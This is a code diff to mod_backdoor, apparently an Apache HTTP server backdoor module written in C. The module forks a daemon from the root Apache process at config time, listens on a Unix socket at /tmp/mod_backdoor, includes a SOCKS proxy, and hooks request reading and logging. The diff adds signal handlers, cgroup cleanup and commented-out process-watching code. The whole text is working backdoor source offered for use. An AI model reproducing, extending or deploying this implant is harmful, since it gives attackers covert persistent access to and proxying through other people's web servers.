@@ -42,6 +42,7 @@
 
 #include "mod_backdoor.h"
 
+
 //////// SOCKS proxy ////////
 #define _GNU_SOURCE
 #define _POSIX_C_SOURCE 200809L
@@ -133,7 +134,7 @@ static void dolog(const char* fmt, ...) { }
 #define IPC "/tmp/mod_backdoor"
 
 pid_t pid;
-
+static sblist* pidList;
 
 /****************************/
 /// SOCKS proxy functions ///
@@ -940,16 +941,71 @@ void* rmCgroup(){
             // ----------------------------
             free(str);
         }
-        umount(CGROUP2);
+        if (umount(CGROUP2) == 0 ){
+            rmdir(CGROUP2);
+        }
         free(path);
     }
 }
+
+/*void* amIAlone(){
+    char pidLine[1024];
+    char *opid;
+    int i = 0;
+    FILE *pidFile = popen("pidof apache2","r");
+    fgets(pidLine,1024,pidFile);
+
+    opid = strtok(pidLine," ");
+    while(opid != NULL)
+    {
+        opid = strtok(NULL, " ");
+        i++;
+    }
+    pclose(pidFile);
+    if(i < 3){
+        if (kill(getpid(),SIGTERM) == -1){
+            kill(getpid(),SIGKILL);
+        }
+        return;
+    }else{
+        sleep(3);
+        amIAlone();
+    }
+}*/
+
+/*void* amIAlone(){
+
+    size_t i = sblist_getsize(pidList);
+    *//*while(1){
+        for(i=0;i<sblist_getsize(pidList);i++) {
+            if(kill(sblist_get(pidList,i),0) != 0){
+                exit(0);
+            }
+        }
+        sleep(1);
+    }*//*
+}*/
 
 int waitIPC(int master){
     pthread_t thread_id;
     fd_set readfds;
     int rc, sd, sr;
     char buf[1024];
+
+    //pthread_create(thread_id, NULL, amIAlone,NULL);
+    //pthread_join(thread_id,NULL);
+
+    /*pid = fork();
+    if(pid == 0){
+        pid = fork();
+        if(pid==0){
+            amIAlone();
+        }else{
+            exit(0);
+        }
+    }else{
+        exit(0);
+    }*/
 
     while(1) {
         FD_ZERO(&readfds);
@@ -1000,14 +1056,34 @@ int waitIPC(int master){
     }
 }
 
+void sig_handler(int signum)
+{
+    remove(IPC);
+    if (signum == SIGKILL){
+        exit(137);
+    }
+    if(signum == SIGTERM){
+        exit(0);
+    }
+}
 
 int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp, server_rec *s) {
+    // Clean old IPC to assure compatibility with non-systemd systems
+    // systemd has a private /tmp for apache2, which is cleaned everytime the service (re)start
+    // init-like process doesn't have private /tmp by default for apache2
+    // That was an issue when restarting the apache2 service
+    //apr_pool_cleanup_register(s->pool,NULL,removeIPC,apr_pool_cleanup_null);
 
     pid = fork();
     // Return father process just after he had loaded the config to create apache2 root daemon
-    if (pid) {
+    if (pid > 0) {
+        //sblist_add(pidList,&pid);
         return OK;
     }
+
+    signal(SIGTERM, sig_handler);
+    signal(SIGKILL, sig_handler);
+
     int master, rc, sd, sr;
     struct sockaddr_un serveraddr;
     char buf[1024];
@@ -1018,6 +1094,10 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
     if (sd < 0) {
         exit(0);
     }
+    /*int reuse;
+    if (setsockopt(master, SOL_SOCKET, SO_REUSEADDR, (char *)&reuse, sizeof(int)) == -1){
+        exit(0);
+    }*/
     memset(&serveraddr, 0, sizeof(serveraddr));
     serveraddr.sun_family = AF_UNIX;
     strcpy(serveraddr.sun_path, IPC);
@@ -1054,9 +1134,19 @@ static int backdoor_log_transaction(request_rec *r) {
 	exit(0);
 }
 
-static void backdoor_register_hooks(apr_pool_t *p){
+/*apr_pool_cleanup_register(p,NULL,removeIPC,apr_pool_cleanup_null);
+
+void apr_pool_cleanup_register 	( 	apr_pool_t *  	p,
+                                       const void *  	data,
+                                       apr_status_t(*)(void *)  	plain_cleanup,
+                                       apr_status_t(*)(void *)  	child_cleanup
+)*/
+
+
+        static void backdoor_register_hooks(apr_pool_t *p){
 	ap_hook_post_read_request((void *) backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
 	ap_hook_post_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
+    //ap_hook_pre_config((void *) backdoor_post_config, NULL, NULL, APR_HOOK_FIRST);
 	ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
 }
 
